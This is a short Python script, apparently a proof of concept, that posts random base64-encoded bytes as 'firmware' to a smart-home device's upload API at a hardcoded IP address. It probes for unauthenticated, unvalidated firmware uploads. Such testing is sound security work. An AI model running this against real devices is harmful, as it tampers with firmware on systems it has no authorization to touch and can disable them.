import requests
import json
import base64
import os

def upload_fake_firmware_binary():
    url = "http://98.70.102.40:8080/api/smart-home/firmware/upload"
    binary_data = os.urandom(32)
    encoded_data = base64.b64encode(binary_data).decode()

    payload = {
        "firmware": encoded_data
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload))
    print("[*] Uploaded random binary payload (base64)")
    print("[*] Response:", response.text)

upload_fake_firmware_binary()
